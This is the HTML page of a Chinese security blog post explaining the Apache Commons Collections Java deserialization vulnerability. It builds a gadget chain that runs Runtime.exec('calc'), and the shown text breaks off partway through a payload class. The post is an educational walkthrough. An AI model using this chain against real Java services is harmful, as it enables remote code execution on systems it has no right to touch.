@@ -1,0 +1,1684 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="Re5JdegRYzNFco-rC9lYIsvSWIgh5JvyfhuEaZCeFCk">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/avatar.jpg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="利用Commons Collections攻击反序列化漏洞由FoxGlove Security团队首次提出，也是我们第一次看到反序列化类型漏洞的利用，而其整个利用过程后来也被成为面向属性编程（POP），虽然事隔久远，但是还是参考先前大佬们的研究学习一下。 Apache Commons CollectionsApache Commons Collections（以下代码使用commons-colle">
+<meta name="keywords" content="Web安全,Java,反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化2：Commons Collections Java反序列化漏洞与POP Gadgets">
+<meta property="og:url" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/index.html">
+<meta property="og:site_name" content="Anemone&#39;s Blog">
+<meta property="og:description" content="利用Commons Collections攻击反序列化漏洞由FoxGlove Security团队首次提出，也是我们第一次看到反序列化类型漏洞的利用，而其整个利用过程后来也被成为面向属性编程（POP），虽然事隔久远，但是还是参考先前大佬们的研究学习一下。 Apache Commons CollectionsApache Commons Collections（以下代码使用commons-colle">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546088911400.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546157968457.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546157830173.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546089796235.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546090891949.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546160655463.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546173400906.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546172924442.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546224558228.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546224687897.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546225603303.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546226115263.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546226273203.png">
+<meta property="og:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546227538067.png">
+<meta property="og:updated_time" content="2019-09-22T10:14:18.723Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Java反序列化2：Commons Collections Java反序列化漏洞与POP Gadgets">
+<meta name="twitter:description" content="利用Commons Collections攻击反序列化漏洞由FoxGlove Security团队首次提出，也是我们第一次看到反序列化类型漏洞的利用，而其整个利用过程后来也被成为面向属性编程（POP），虽然事隔久远，但是还是参考先前大佬们的研究学习一下。 Apache Commons CollectionsApache Commons Collections（以下代码使用commons-colle">
+<meta name="twitter:image" content="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546088911400.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Anemone's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Java反序列化2：Commons Collections Java反序列化漏洞与POP Gadgets | Anemone's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Anemone's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://anemone.top/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Anemone">
+      <meta itemprop="description" content="关注Web安全、移动安全、Fuzz测试和机器学习">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anemone's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Java反序列化2：Commons Collections Java反序列化漏洞与POP Gadgets
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-29 19:48:15" itemprop="dateCreated datePublished" datetime="2018-12-29T19:48:15+08:00">2018-12-29</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-22 18:14:18" itemprop="dateModified" datetime="2019-09-22T18:14:18+08:00">2019-09-22</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全-反序列化/" itemprop="url" rel="index"><span itemprop="name">Web安全-反序列化</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/" class="leancloud_visitors" data-flag-title="Java反序列化2：Commons Collections Java反序列化漏洞与POP Gadgets">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数：</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>利用Commons Collections攻击反序列化漏洞由FoxGlove Security团队首次提出，也是我们第一次看到反序列化类型漏洞的利用，而其整个利用过程后来也被成为面向属性编程（POP），虽然事隔久远，但是还是参考先前<a href="https://security.tencent.com/index.php/blog/msg/97" title="Commons Collections Java反序列化漏洞深入分析," target="_blank" rel="noopener">大佬们的研究</a>学习一下。</p>
+<h1 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h1><p>Apache Commons Collections（以下代码使用commons-collections-3.2.1.jar）拓展了Java原生Collection结构的第三方库，其中有一个TransformedMap类是本文的研究对象。它可以装饰一个基本Map，返回一个TransformedMap，当新元素加入TransformedMap时会对元素进行预先定义的变换（Transformer），比如说有如下代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">"concat"</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">"transformed"</span>&#125; );</span><br><span class="line">Map transformMap = TransformedMap.decorate(map, <span class="keyword">null</span>, invokerTransformer);</span><br><span class="line">transformMap.put(<span class="string">"key1"</span>, <span class="string">"value1"</span>);</span><br><span class="line">transformMap.forEach((key, value) -&gt; System.out.println(key + <span class="string">":"</span> + value + <span class="string">"\n"</span>));</span><br></pre></td></tr></table></figure>
+<p>执行后结果为：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546088911400.png" alt="1546088911400"></p>
+<p>注意到InvokerTransformer类，它让我们通过反射的方法调用任意对象的任意方法，其构造函数第一个参数是元素的方法（<code>&quot;concat&quot;</code>），第二个参数是方法的参数类型数组（<code>new Class[]{String.class}</code>），第三个参数是具体参数值（<code>new Object[]{&quot;transformed&quot;}</code>），在上面代码的Transfer实际上是调用了<code>value.concat(&quot;transformed&quot;)</code>方法。</p>
+<p>具体来说，对于每个put进来的value——更准确的说是setValue()——都会触发TransformedMap.checkSetValue()：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546157968457.png" alt="1546157968457"></p>
+<p>该操作最终触发invokerTransformer.transform()：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546157830173.png" alt="1546157830173"></p>
+<p>invokerTransformer.transform()演示：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// InvokerTransformer Usage</span></span><br><span class="line">InvokerTransformer invokerTransformer1 = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">    <span class="string">"concat"</span>,</span><br><span class="line">    <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> Object[]&#123;<span class="string">"transformed"</span>&#125; );</span><br><span class="line">Object result = invokerTransformer1.transform(<span class="string">"raw"</span>) ;</span><br><span class="line">System.out.printf(result.toString());</span><br><span class="line"><span class="comment">// 输出 rawtransformed</span></span><br></pre></td></tr></table></figure>
+<h2 id="使用transform弹出计算器"><a href="#使用transform弹出计算器" class="headerlink" title="使用transform弹出计算器"></a>使用transform弹出计算器</h2><p>如果我们transform的对象就是Runtime，那情况就很好办了，直接调用它的exec(“calc”)方法就行了：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546089796235.png" alt="1546089796235"></p>
+<h2 id="构造Transformer链"><a href="#构造Transformer链" class="headerlink" title="构造Transformer链"></a>构造Transformer链</h2><p>但是TransformedMap正常情况下不会去放Runtime类型（就像文章开头代码那样，可能是字符串或其他类型），那么就需要构造一个Transformer链，先获得Runtime类，再执行exec()方法。</p>
+<p>这里需要用到另一个Transformer类——ConstantTransformer，它的功能是直接将key/value替换成另一个对象：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546090891949.png" alt="1546090891949"></p>
+<p>如上图所示，这里我们还是用了一个TransformerChain，TransformedMap允许我们定义一个Transformer链，上一个Transformer的结果再传递给下一个Transformer，这样我们就可以构造一个恶意的链来弹计算器了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilTransformer2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// InvokerTransformer Usage</span></span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">// Runtime</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">// (Method)Runtime.class.getMethod("getRuntime", null)</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(函数名，返回值类型)</span></span><br><span class="line">                <span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(函数名，函数参数)</span></span><br><span class="line">                <span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line">                <span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"calc"</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line">        Map transformMap = TransformedMap.decorate(map, <span class="keyword">null</span>, evilTransformerChain);</span><br><span class="line">        transformMap.put(<span class="string">"key1"</span>, <span class="string">"value1"</span>);</span><br><span class="line">        transformMap.forEach((key, value) -&gt; System.out.println(key + <span class="string">":"</span> + value + <span class="string">"\n"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>整个Chain实际上就是执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.class.getMethod(<span class="string">"getRuntime"</span>, <span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>).exec(<span class="string">"calc"</span>)</span><br></pre></td></tr></table></figure>
+<p>同样可以弹出计算器。</p>
+<h1 id="Annotation-Invocation-Handler"><a href="#Annotation-Invocation-Handler" class="headerlink" title="Annotation Invocation Handler"></a>Annotation Invocation Handler</h1><p>假设有一个不安全的反序列化函数，我们如何借助Apache Commons Collections进行命令执行呢？</p>
+<p>我们知道我们传入的类必须是程序里面已经存在的类（这已经在第一篇里验证），因此我们就需要找一个类，它满足两个条件：1）该类存在于那个不安全的反序列化应用中；2）该类的readObject()调用了先前讨论的transformMap.checkSetValue()。这样我们就可以在构造一个恶意类让其反序列化，接着它调用setValue方法，就可以执行我们的代码了。</p>
+<p>于是我们的目光转移到了Annotation Invocation Handler，可以看到在其属性memberValues不为空的情况下，会执行setValue方法：</p>
+<p><strong>注意：高版本的java已经修复了这一问题，如需复现使用jdk8u66及以前版本</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// 此处触发一系列的Transformer</span></span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>于是我们可以实例化一个AnnotationInvocationHandler类，先设置一个不为空的map，再将其用先前的Transformer装饰，再将其序列化，给不安全的反序列化函数读取，这样就可以进行任意代码执行了：</p>
+<p>考虑通过<code>if (memberType != null)</code>,经过事后调试可以知道memberTypes中存在一个<code>&lt;&quot;value&quot;, java.lang.annotation.RetentionPolicy&gt;</code>的键值对，所以我们构造payload时，需要保证<code>name=&quot;value&quot;</code>即<code>key=“value&quot;</code>。</p>
+<p>考虑通过第二个<code>if (!(memberType.isInstance(value) ||value instanceof ExceptionProxy))</code>，即保证两者都不满足，这很简单，传入的map中value不要是以上两种类型即可。</p>
+<p>根据上述思路，可以产生如下payload：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PayloadTransformedMap</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">				<span class="comment">// Runtime</span></span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">				<span class="comment">// (Method)Runtime.class.getMethod("getRuntime", null)</span></span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(函数名，返回值类型)</span></span><br><span class="line">				<span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span 